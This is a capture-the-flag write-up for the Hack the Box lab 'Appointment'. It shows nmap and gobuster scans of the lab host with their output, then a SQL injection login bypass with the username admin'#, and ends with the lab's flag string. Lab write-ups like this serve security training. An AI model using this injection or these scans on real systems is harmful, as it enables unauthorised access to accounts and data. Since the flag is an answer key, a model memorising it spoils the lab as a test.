Hack the Box
Starting Point

Appointment

10.129.117.137

nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/Appointment 10.129.117.137

Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-18 04:41 Americas
Nmap scan report for 10.129.117.137
Host is up (0.13s latency).
Not shown: 994 closed ports
PORT    STATE    SERVICE          VERSION
80/tcp  open     http             Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login
113/tcp filtered ident
199/tcp filtered smux
256/tcp filtered fw1-secureremote
445/tcp filtered microsoft-ds
993/tcp filtered imaps

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds

gobuster -u http://10.129.117.137/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.129.117.137/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/06/18 05:04:30 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
=====================================================
2023/06/18 05:24:57 Finished
=====================================================

** Nothing helpful from gobuster

** Let's try to see we can mess with SQL with login page

** after trying default passwords, lets try to use SQL injection:

** add a single quote (to end the input) and a # (to comment out the rest of the input)

Username: admin'#


Congratulations!

Your flag is: e3d0796d002a446c0e622226f42e9672
